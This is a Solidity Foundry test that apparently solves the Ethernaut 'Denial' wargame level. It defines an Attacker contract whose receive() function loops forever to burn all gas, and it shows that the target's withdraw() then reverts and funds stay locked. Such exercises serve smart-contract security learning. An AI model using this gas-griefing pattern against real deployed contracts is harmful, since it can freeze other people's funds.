// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Denial.sol";

contract Attacker {
    Denial public target;

    constructor(address _target) {
        target = Denial(payable(_target));
    }

    receive() external payable {
        // consume all gas → causes withdraw to fail
        while (true) {
            uint256 i = 2 * 3 * 4 * 6 * 77;
        }
    }
}

contract DenialTest is Test {
    Denial level;
    Attacker attacker;
    address player = makeAddr("player");

    function setUp() public {
        level = new Denial();
        attacker = new Attacker(address(level));
        vm.deal(player, 1 ether);
    }

    function test_denial() public {
        vm.startPrank(player);

        // fund contract
        address(level).call{value: 0.001 ether}("");

        // set attacker as withdraw partner
        level.setWithdrawPartner(address(attacker));

        // withdraw should fail due to gas exhaustion
        vm.expectRevert();
        address(level).call{gas: 1_000_000}(
            abi.encodeWithSignature("withdraw()")
        );

        // funds remain stuck
        assertEq(address(level).balance, 0.001 ether);

        vm.stopPrank();
    }
}